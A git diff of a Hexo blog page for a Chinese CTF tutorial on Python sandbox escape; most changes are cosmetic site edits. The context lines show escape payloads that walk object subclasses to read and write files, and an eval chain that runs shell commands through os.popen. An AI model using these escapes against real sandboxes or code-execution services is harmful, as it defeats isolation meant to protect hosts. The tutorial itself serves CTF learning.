@@ -90,6 +90,17 @@
   };
 </script>
 
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
 
   
 
@@ -101,20 +112,20 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Python沙盒逃逸">
 <meta property="og:url" content="https://zo1ro.github.io/2018/09/14/py-sandbox/index.html">
-<meta property="og:site_name" content="一个向往acm的ctf_dog">
+<meta property="og:site_name" content="ZO1RO">
 <meta property="og:description" content="沙盒逃逸简介沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程 对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个  使用os包中的popen,system两个函数来直接执行shell 使用commands模块中的方法 使用subprocess 使用写文件到指定位置,再使用其他辅助手段  1234">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://zo1ro.github.io/2018/09/14/py-sandbox/py-sandbox/1.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/09/14/py-sandbox/py-sandbox/2.png">
-<meta property="og:updated_time" content="2019-05-08T15:26:26.730Z">
+<meta property="og:image" content="https://zo1ro.github.io/2018/09/14/py-sandbox/1.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/09/14/py-sandbox/2.png">
+<meta property="og:updated_time" content="2019-05-09T16:35:30.263Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Python沙盒逃逸">
 <meta name="twitter:description" content="沙盒逃逸简介沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程 对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个  使用os包中的popen,system两个函数来直接执行shell 使用commands模块中的方法 使用subprocess 使用写文件到指定位置,再使用其他辅助手段  1234">
-<meta name="twitter:image" content="https://zo1ro.github.io/2018/09/14/py-sandbox/py-sandbox/1.png">
+<meta name="twitter:image" content="https://zo1ro.github.io/2018/09/14/py-sandbox/1.png">
 
 
 
-  <link rel="alternate" href="/atom.xml" title="一个向往acm的ctf_dog" type="application/atom+xml">
+  <link rel="alternate" href="/atom.xml" title="ZO1RO" type="application/atom+xml">
 
 
 
@@ -130,7 +141,7 @@
   };
 </script>
 
-  <title>Python沙盒逃逸 | 一个向往acm的ctf_dog</title>
+  <title>Python沙盒逃逸 | ZO1RO</title>
   
 
 
@@ -189,10 +200,14 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">一个向往acm的ctf_dog</span>
+        <span class="site-title">ZO1RO</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
+    
+      
+        <p class="site-subtitle">一个向往acm的ctf_dog</p>
+      
     
     
   </div>
@@ -338,7 +353,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="一个向往acm的ctf_dog">
+      <meta itemprop="name" content="ZO1RO">
     </span>
 
     
@@ -375,22 +390,6 @@
               <time title="Created: 2018-09-14 21:40:24" itemprop="dateCreated datePublished" datetime="2018-09-14T21:40:24+08:00">2018-09-14</time>
             
 
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-05-08 23:26:26" itemprop="dateModified" datetime="2019-05-08T23:26:26+08:00">2019-05-08</time>
-              
             
           </span>
 
@@ -452,11 +451,11 @@
 <h2 id="沙盒逃逸各种方法"><a href="#沙盒逃逸各种方法" class="headerlink" title="沙盒逃逸各种方法"></a>沙盒逃逸各种方法</h2><p>在python中，不用引入直接使用的内置函数称为 builtin 函数（内联函数），随着<strong>builtin</strong>这一个 module 自动被引入到环境中</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//函数调用执行</span><br><span class="line">__builtin__.open()</span><br><span class="line">__builtin__.int()</span><br><span class="line">__builtin__.chr()</span><br></pre></td></tr></table></figure>
 <p>(在python3.x 版本中,<code>__builtin__</code>变成了<code>builtins</code>,而且需要引入)</p>
-<p><img src="py-sandbox/1.png" alt></p>
+<p><img src="1.png" alt></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//如果一些内联函数在builtins删除 ，我们可以通过reload(__builtins__)重新载入获取一个完整的builtins</span><br><span class="line">//但是,reload也是__builtin__下面的函数,如果直接把它干掉,就没办法重新引入了</span><br><span class="line">//这个时候可以在python中引入一个名为imp的模块</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br><span class="line">//然后我们就会重新得到完整的__builtin__模块了</span><br></pre></td></tr></table></figure>
 <p>python的object类中集成了很多的基础函数，下面举常见两种方法进入类调用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(().__class__.__bases__[<span class="number">0</span>])</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>])</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>]</span><br><span class="line"></span><br><span class="line">//存在hook函数可直接调用</span><br></pre></td></tr></table></figure>
-<p><img src="py-sandbox/2.png" alt></p>
+<p><img src="2.png" alt></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//其中存在file类</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br><span class="line"></span><br><span class="line">//可直接进行文件操作</span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'E:\zo1ro.md'</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/zo1ro.html'</span>, <span class="string">'w'</span>).write(<span class="string">'helloworld'</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ifconfig").read()'</span> )</span><br></pre></td></tr></table></figure>
 <p>在os模块被屏蔽后，可通过其他子类进行调用os模块进行命令执行和文件读写</p>
 <p>这里举例通过warnings.catch_warnings类调用</p>
@@ -537,7 +536,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/ctf/" rel="tag">📖ctf</a>
           
         </div>
       
@@ -631,7 +630,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -654,7 +653,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                    <span class="site-state-item-count">3</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -673,6 +674,32 @@
 
           
 
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ZO1RO" title="GitHub &rarr; https://github.com/ZO1RO" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:em8xcm93ZWJAMTYzLmNvbQo=" title="E-Mail &rarr; mailto:em8xcm93ZWJAMTYzLmNvbQo=" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
           
 
           
@@ -825,9 +852,18 @@
 
 
 
+  
+  
 
 
 
+  
+  
+
+
+
+  
+  
 
 
 
@@ -843,6 +879,18 @@
 
   
   <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+  
+  <script src="/lib/three/canvas_lines.min.js"></script>
+
+  
+  <script src="/lib/three/canvas_sphere.min.js"></script>
 
 
   
@@ -896,6 +944,13 @@
   
 
   
+  
+
+  
+  
+
+  
+
 
   
 
